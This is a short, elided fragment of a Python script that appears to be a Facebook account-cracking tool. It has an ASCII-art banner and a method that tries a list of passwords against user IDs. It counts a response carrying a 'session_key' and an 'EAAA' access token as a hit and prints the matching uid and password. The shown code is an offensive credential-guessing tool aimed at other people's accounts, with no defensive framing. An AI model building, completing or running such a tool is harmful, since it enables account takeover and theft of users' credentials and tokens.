...
888b     d888        d8888 888    d8b  .d8888b.  
8888b   d8888       d88888 888    88P d88P  Y88b 
88888b.d88888      d88P888 888    8P  Y88b.      
888Y88888P888     d88P 888 888    "    "Y888b.   
888 Y888P 888    d88P  888 888            "Y88b. 
...
\033[1;90m══════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [FAIJUL_OLD] : %s/%s -> \033[0;92m [FAIJUL-OK:%s ]- \033[0;91m[FAIJUL-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[FAIJUL-OK] %s|%s\033[0;97m         "%(uid, pw))
